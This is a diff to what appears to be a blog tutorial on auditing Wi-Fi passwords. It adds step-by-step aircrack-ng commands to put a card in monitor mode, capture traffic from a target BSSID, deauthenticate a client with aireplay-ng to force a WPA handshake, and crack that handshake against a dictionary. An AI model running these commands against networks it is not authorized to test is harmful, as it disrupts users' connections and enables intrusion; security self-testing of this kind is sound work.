@@ -5,7 +5,7 @@ title: Check your wireless password, or someone could intrude ?
 
 # Introduction
 
-Wireless is open to attack. Network can be interuppted any time.
+Wireless is open to attack. Network can be interuppted at any time.
 
 # Hardware
 
@@ -35,9 +35,48 @@ airmon-ng check
 airmon-ng check kill
 airmon-ng
 airmon-ng start wlan0 # this will create another adapter mon0
-airodump-ng mon0 -w all # list all networks (BSSID), channel (CH) and clients
-airodump-ng mon0 -c 6 --bssid 12:12:12:12:12:12:12 -w komsa
 ~~~
+
+`airmon-ng start` will show a message that other programs could interfere. You
+can `sudo pkill NetworkManager` but it will just restart it. So far so good, all
+those programs could stay running (but you should disconnect from all networks).
+
+# Theory
+
+[WPA/WPA2](https://www.aircrack-ng.org/doku.php?id=cracking_wpa&DokuWiki=3mlmhn080hqo8eb6p0qsqpvas4)
+supports many types of authentication, and only PSK (pre-shared key) AUTH is
+crackable. There is no difference between cracking WPA and WPA2.
+There is no benefit from collectin IVs. Only we can do is to get handshake when
+client connects to the network. Than we can test our dictionary with 300 keys
+per second.
+
+~~~
+# list all networks (BSSID), channel (CH) and clients
+airodump-ng mon0 -w output
+airodump-ng mon0 --bssid 12:12:12:12:12:12 -w output
+# better is to use channel option -c since more packets are stored
+airodump-ng mon0 -c 1 -w output
+~~~
+
+Instead of waiting you can deauthenticate some clients:
+
+~~~
+aireplay-ng -0 1 -a 12:12:12:12:12:12 -c 11:11:11:11:11:11 --ignore-negative-on mon0
+# it should returns some number of ACK [ 5|55 ACKs]
+~~~
+
+Note that you can capture all networks (any handshare will be stored) but more
+packets will be stored if you listen on specific frequency.
+On top of the page it should say: `WPA handshake: 12:12:12:12:12:12` but it
+could be replaces with some info. You can check anytime if some od handshake are
+stored
+
+~~~
+aircrack-ng output*.cap
+~~~
+
+Use two different cards, when you run `iwconfig` then one should show `IEEE
+802.11bg` and another `IEEE 802.11bgn`.
 
 # Wifite
 
